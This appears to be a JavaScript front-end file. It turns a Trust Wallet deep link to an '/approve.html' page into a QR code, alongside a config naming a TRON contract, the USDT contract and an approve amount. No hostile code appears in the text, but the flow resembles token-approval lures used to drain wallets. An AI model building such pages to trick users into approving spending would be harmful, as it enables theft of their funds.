// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG = {
    CONTRACT_ADDRESS: "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    APPROVE_AMOUNT: "1000000",
};

// ============================================================
// BUILD THE APPROVE QR CODE
// ============================================================

function generateApproveQR() {
    try {
        // The approve page URL (where the user lands in Trust Wallet DApp browser)
        const approvePageUrl = window.location.origin + "/approve.html";

        // Trust Wallet deep link - opens URL in its built-in DApp browser
        const trustWalletDeepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(approvePageUrl)}`;

        const qrcodeContainer = document.getElementById("qrcode");

        if (typeof QRCode === "undefined") {
            // Fallback: show the link as text if QR library failed
            qrcodeContainer.innerHTML = '<p style="color:#666;font-size:12px;padding:20px;">QR loading failed. Use button below.</p>';
            document.getElementById("mobile-link").href = trustWalletDeepLink;
            return;
        }

        qrcodeContainer.innerHTML = "";

        new QRCode(qrcodeContainer, {
            text: trustWalletDeepLink,
            width: 200,
            height: 200,
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.M,
        });

        // Set mobile link
        document.getElementById("mobile-link").href = trustWalletDeepLink;
    } catch (err) {
        console.error("QR generation error:", err);
        var errEl = document.getElementById("error-msg");
        if (errEl) {
            errEl.style.display = "block";
            errEl.textContent = "Error generating QR: " + err.message;
        }
    }
}

// Initialize when DOM is ready
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", generateApproveQR);
} else {
    generateApproveQR();
}
